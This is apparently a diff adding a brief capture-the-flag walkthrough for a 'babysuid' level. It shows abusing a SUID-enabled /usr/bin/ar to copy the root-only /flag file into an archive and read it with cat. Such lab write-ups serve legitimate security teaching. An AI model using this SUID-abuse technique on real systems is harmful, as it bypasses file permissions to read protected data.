@@ -1,0 +1,5 @@
+Read the challenge file using /challenge/babysuid_level21
+Check SUID permissions using ls -la /challenge/babysuid_level21. U will find /usr/bin/ar file 
+Try to read the flag file as /usr/bin/ar /flag but the flag will not show. 
+First, use ar rc /flag.a /flag
+Then use cat /flag.a The flag will show. 
